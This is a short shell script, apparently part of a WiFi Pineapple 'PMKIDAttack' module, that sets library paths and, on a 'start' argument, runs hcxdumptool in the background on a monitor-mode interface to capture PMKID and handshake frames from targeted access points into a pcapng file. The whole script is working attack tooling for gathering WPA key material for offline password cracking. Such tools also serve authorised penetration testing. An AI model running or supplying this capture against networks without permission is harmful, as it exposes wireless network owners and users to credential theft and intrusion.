#!/bin/sh

export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/sd/lib:/sd/usr/lib
export PATH=$PATH:/sd/usr/bin:/sd/usr/sbin

if [[ "$1" = "start" ]]; then
    hcxdumptool -o /tmp/$2.pcapng -i wlan1mon --filterlist=/pineapple/modules/PMKIDAttack/filter.txt --filtermode=2 --enable_status=1 &> /dev/null &
fi